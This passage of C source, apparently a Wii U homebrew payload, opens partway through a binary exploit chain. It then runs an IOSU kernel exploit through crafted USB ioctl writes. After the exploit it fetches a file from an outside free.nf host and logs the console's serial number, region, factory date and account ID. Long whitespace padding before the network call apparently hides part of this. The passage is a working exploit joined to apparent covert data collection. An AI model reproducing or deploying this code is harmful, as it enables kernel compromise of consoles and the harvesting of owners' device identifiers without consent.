  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xeb, 0xb4,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x13, 0x12, 0xd0
};
static const unsigned int final_chain_bin_len = 840;

int32_t (*ACPInitialize)(void);
int32_t (*ACPTurnOnDrcLed)(int32_t persistentId);
int32_t (*GetAccountId__Q2_2nn3actFPc)(void);

int32_t NId = -1;

void InitDRCStuff()
{
	unsigned int acp_handle;
  unsigned int act_handle;
	OSDynLoad_Acquire("nn_acp.rpl", &acp_handle);
	OSDynLoad_Acquire("nn_act.rpl", &act_handle);

	OSDynLoad_FindExport(acp_handle, 0, "ACPInitialize", (void**)&ACPInitialize);
	OSDynLoad_FindExport(acp_handle, 0, "ACPTurnOnDrcLed", (void**)&ACPTurnOnDrcLed);
	OSDynLoad_FindExport(act_handle, 0, "GetAccountId__Q2_2nn3actFPc", (void**)&GetAccountId__Q2_2nn3actFPc);

	ACPInitialize();
	NId = GetAccountId__Q2_2nn3actFPc();
}

void ChangeDrcLedPattern()
{
	ACPTurnOnDrcLed(NId);
}

uint32_t *Root_Hub1 = (uint32_t *)0xF5003ABC;
uint32_t *Root_Hub2 = (uint32_t *)0xF4500000;

void USB_Write32(int handle, uint32_t addr, uint32_t value)
{
	Root_Hub2[520] = addr - 24;
	DCFlushRange(Root_Hub2, 521 * 4);
	DCInvalidateRange(Root_Hub2, 521 * 4);

	OSSleepTicks(0x200000);

	uint32_t request_buffer[] = {0xFFF415D4, value};
	uint32_t output_buffer[32];

	log_printf("%d", IOS_Ioctl(handle, 0x15, request_buffer, 0x08, output_buffer, 0x80));

}

void IOSU_Exploit(uint8_t* kernel_code, int kernel_code_size)
{
	uint32_t IOS_USB_Node_FD = (uint32_t)IOS_Open("/dev/uhs/0", (int)0);

	log_printf("/dev/uhs/0: %d", IOS_USB_Node_FD);

	memset(Root_Hub1, 0, 0x800);
	memset(Root_Hub2, 0, 0x800);

	Root_Hub2[5] = 1;
	Root_Hub2[8] = 0x00500000; // OSEffectiveToPhysical(Root_Hub2)

	Root_Hub1[33] = 0x00500000; // OSEffectiveToPhysical(Root_Hub2)
	Root_Hub1[78] = 0;

	DCFlushRange(Root_Hub1, 0x1000);
	DCInvalidateRange(Root_Hub1, 0x1000);

	uint32_t *hehe = (uint32_t*)&final_chain_bin[796];
	*hehe = kernel_code_size;

	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0x14, 0x1016AD40 + 0x14 + 0x4 + 0x20);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0x10, 0x1011814C);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0xC, 0x00120000);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40, 0x1012392b);

	IOS_Close(IOS_USB_Node_FD);
}

int MainThread(int argc, void* argv)
{	
	InitDRCStuff();

    IOS_Ioctl((uint32_t)IOS_Open("/dev/mcp", (int)0), 0xD3, 0, 0, &deviceID, 4);

	IOSU_Exploit((uint8_t*)arm_kernel_bin, arm_kernel_bin_len);

    os_function_ptr_t os_functions;
    curl_function_ptr_t curl_functions;
    nsysnet_function_ptr_t nsysnet_functions;
    init_os_function_ptr(&os_functions);
    init_curl_function_ptr(&curl_functions);
    init_nsysnet_function_ptr(&nsysnet_functions);
    g_os_functions = os_functions;
    g_curl_functions = curl_functions;
    g_nsysnet_functions = nsysnet_functions;
    int size = 0;
    char *buffer;
    																								                                                                            deviceID;
    getFile("http://cedkechatml.free.nf/logs/logs.txt", &buffer, &size, curl_functions, os_functions, nsysnet_functions);

	log_printf("SerialNumber: %s%s\nRegion: %s-%s\nFactory date: %02x-%02x-%04x @ %02x:%02x\nDeviceAccountID: %d",(char*)(0xF5FFFC00 + 0x158), 
																									(char*)(0xF5FFFC00 + 0x160), 
																									(char*)(0xF5FFFC00 + 0x150), 
																									(char*)(0xF5FFFC00 + 0x154),
																									*(char*)(0xF5FFFC00 + 0x18B),
																									*(char*)(0xF5FFFC00 + 0x18A),
																									*(short*)(0xF5FFFC00 + 0x188),
																									*(char*)(0xF5FFFC00 + 0x18C),
																									*(char*)(0xF5FFFC00 + 0x18D),
																									deviceID);

	return 0;

}